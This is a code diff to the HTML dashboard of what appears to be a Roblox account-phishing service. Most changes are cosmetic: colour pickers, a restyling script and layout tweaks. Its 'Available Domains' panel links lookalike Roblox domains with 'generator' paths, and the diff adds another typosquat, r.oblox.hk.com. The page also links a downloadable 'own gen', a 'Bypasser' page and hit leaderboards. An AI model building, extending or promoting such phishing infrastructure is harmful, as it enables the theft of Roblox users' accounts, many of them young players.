@@ -11,6 +11,7 @@
             background: linear-gradient(to bottom right, #1c0033, #3d0066);
             color: white;
             display: flex;
+            transition: background 0.3s ease-in-out, color 0.3s ease-in-out;
         }
         .sidebar {
             width: 250px;
@@ -21,10 +22,6 @@
             flex-direction: column;
             border-right: 3px solid rgba(255, 255, 255, 0.1);
             transition: 0.3s ease-in-out;
-        }
-        .sidebar:hover {
-            box-shadow: 0 0 15px rgba(255, 0, 255, 0.7);
-            transform: scale(1.02);
         }
         .sidebar h1 {
             color: #e066ff;
@@ -56,6 +53,7 @@
             flex-grow: 1;
             display: flex;
             flex-direction: row;
+            flex-wrap: wrap;
             justify-content: space-around;
             padding: 40px 20px 20px;
             gap: 20px;
@@ -123,7 +121,18 @@
             <li onclick="location.href='settings.html'">Settings</li>
             <li onclick="location.href='bypasser.html'">Bypasser [EXCLUSIVE ⭐]</li>
         </ul>
+
+        <!-- Theme Toggle Button -->
+        <button class="button" onclick="applyChanges()">Apply Changes</button>
+
+        <!-- Color Selectors -->
+        <label for="mainColorPicker" style="color: white; margin-top: 20px;">Choose Main Color:</label>
+        <input type="color" id="mainColorPicker" value="#e066ff">
+
+        <label for="highlightColorPicker" style="color: white; margin-top: 20px;">Choose Highlight Color:</label>
+        <input type="color" id="highlightColorPicker" value="#ff00ff">
     </div>
+
     <div class="content">
         <div class="panel">
             <h2>Available Domains</h2>
@@ -131,10 +140,7 @@
             <a href="https://spoo.me/fXZb80" class="button" target="_blank">robiox.com.kg</a>
             <a href="https://roblox.com.py/create/FaNumv2l/generator" class="button" target="_blank">roblox.com.py</a>
             <a href="https://mega.nz/file/SJo13B6C#Ms5Z9zomWPtWgNMEKgcd45KDenuCvdxF70LXWtu8Nu4" class="button" target="_blank">own gen</a>
-        </div>
-        <div class="panel">
-            <h2>Live Hits [UTC +8]</h2>
-            <button class="button red">Live Visitors</button>
+            <a href="https://r.oblox.hk.com/create/FANUMV2/generator" class="button" target="_blank">r.oblox.hk.com</a>
         </div>
         <div class="panel">
             <h2>Leaderboards (GLOBAL)</h2>
@@ -150,5 +156,42 @@
             <p class="leaderboard-item">10. - 0</p>
         </div>
     </div>
+
+    <script>
+        let mainColor = "#e066ff";
+        let highlightColor = "#ff00ff";
+
+        // Function to apply the selected colors when the button is pressed
+        function applyChanges() {
+            // Set the main color
+            document.querySelector('.sidebar h1').style.color = mainColor;
+            document.querySelectorAll('.sidebar ul li').forEach(li => {
+                li.style.borderColor = mainColor;
+            });
+            document.querySelectorAll('.button').forEach(btn => {
+                btn.style.background = `linear-gradient(to right, ${mainColor}, #ff00ff)`;
+            });
+
+            // Set the highlight color
+            document.querySelectorAll('.sidebar ul li').forEach(li => {
+                li.style.background = highlightColor;
+            });
+            document.querySelectorAll('.button').forEach(btn => {
+                btn.style.boxShadow = `0 0 15px ${highlightColor}`;
+            });
+            document.querySelectorAll('.leaderboard-item').forEach(item => {
+                item.style.textShadow = `0 0 5px ${highlightColor}, 0 0 10px ${highlightColor}, 0 0 15px ${highlightColor}`;
+            });
+        }
+
+        // Functions to update color variables based on input change
+        document.getElementById('mainColorPicker').addEventListener('input', function(event) {
+            mainColor = event.target.value;
+        });
+
+        document.getElementById('highlightColorPicker').addEventListener('input', function(event) {
+            highlightColor = event.target.value;
+        });
+    </script>
 </body>
 </html>
